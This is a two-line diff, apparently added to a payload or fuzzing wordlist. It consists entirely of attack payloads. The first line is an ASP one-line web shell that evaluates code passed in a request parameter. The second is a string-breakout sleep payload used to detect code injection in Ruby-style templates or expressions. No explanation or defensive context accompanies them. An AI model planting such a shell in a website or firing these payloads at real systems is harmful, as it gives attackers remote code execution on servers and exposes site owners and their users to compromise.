@@ -1,0 +1,2 @@
+ <%eval request("yjzyxx!")%> 
+'+sleep(20.to_i)+'
